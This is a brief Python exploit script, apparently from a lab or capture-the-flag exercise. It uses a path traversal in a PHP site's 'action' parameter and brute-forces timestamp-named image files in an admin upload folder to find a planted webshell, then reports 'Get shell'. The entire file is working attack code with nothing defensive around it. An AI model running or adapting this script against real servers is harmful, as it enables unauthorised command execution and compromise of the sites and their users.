# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
from datetime import datetime, timezone, timedelta

# third-party imports
import requests

TIME = str(int(datetime.now(timezone(timedelta(hours=8))).timestamp())) + '00'
URL = "http://192.168.200.129/index.php?action=../../../../app/adminpic/"

for i in range(10000):
    time = int(TIME) - i
    filename = f"-cmd{time}.jpg"
    r = requests.get(URL + filename)
    if r.status_code == 200:
        print(f"\033[32m[+] Get shell: {URL + filename}\033[0m")
        break
